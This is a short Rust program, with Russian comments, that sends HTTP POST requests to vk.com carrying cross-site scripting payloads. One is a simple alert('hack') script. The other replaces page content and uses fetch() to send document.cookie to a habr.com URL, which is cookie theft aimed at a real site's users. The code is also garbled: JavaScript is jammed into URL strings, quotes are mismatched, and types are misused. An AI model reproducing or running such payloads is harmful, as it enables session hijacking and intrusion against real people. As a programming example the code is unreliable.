use error_chain::error_chain;
use reqwest::Url;

#[tokio::main]
async fn main() -> Result<()> {
    // Создаем клиент для выполнения HTTP-запросов
    let client = reqwest::Client::new();
    //Получаем ответ
    let url = Url::parse("https://www.vk.com//search?document.forms[0]
        .addEventListener('submit', function(event) {
    // Отменяем стандартное действие отправки формы
    event.preventDefault();=<script>alert('hack')</script>").unwrap();
    let response = client.post("https://www.vk.com")
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(url).send().await?;
    let url2 = Url::parse("https://www.vk.com//search?document.forms[0]
        .addEventListener('submit', function(event) {
    event.preventDefault();=<script>
document.getElementById('main-content').innerHTML = 'зрайлитесь';
fetch('https:'https://career.habr.com/search?query=' + document.cookie);
</script>").unwrap();
    let response2 = client.post("https://www.vk.com").body(url2).send().await?;
    println!("{:?}, {:?}", response.text().await?, response2.text().await?);
    Ok(())
}
error_chain! {
    foreign_links {
        Io(std::io::Error);
        HttpRequest(reqwest::Error);
    }
}